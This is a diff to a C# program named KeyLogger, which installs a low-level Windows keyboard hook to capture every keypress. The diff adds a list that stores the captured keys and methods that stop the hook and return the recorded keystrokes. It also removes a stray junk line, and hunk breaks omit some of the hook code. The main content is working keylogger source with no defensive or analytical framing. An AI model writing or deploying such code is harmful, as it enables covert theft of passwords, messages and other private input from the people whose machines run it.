@@ -1,18 +1,27 @@
-
 using System;
+using System.Collections.Generic;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
 
 public class KeyLogger {
     private static IntPtr hookId = IntPtr.Zero;
     private static LowLevelKeyboardProc proc = HookCallback;
+    private static List<string> keyPresses = new List<string>();
 
     public static void Start() {
         hookId = SetHook(proc);
         Application.Run();
         UnhookWindowsHookEx(hookId);
     }
-asdfha
+
+    public static void Stop() {
+        Application.Exit();
+    }
+
+    public static string[] GetKeyPresses() {
+        return keyPresses.ToArray();
+    }
+
     private static IntPtr SetHook(LowLevelKeyboardProc proc) {
         using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
         using (var curModule = curProcess.MainModule) {
@@ -26,6 +35,8 @@ asdfha
         if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)) {
             int vkCode = Marshal.ReadInt32(lParam);
             Console.WriteLine((Keys)vkCode);
+            keyPresses.Add(((Keys)vkCode).ToString());
+            Console.WriteLine(keyPresses.Count);
         }
         return CallNextHookEx(hookId, nCode, wParam, lParam);
     }
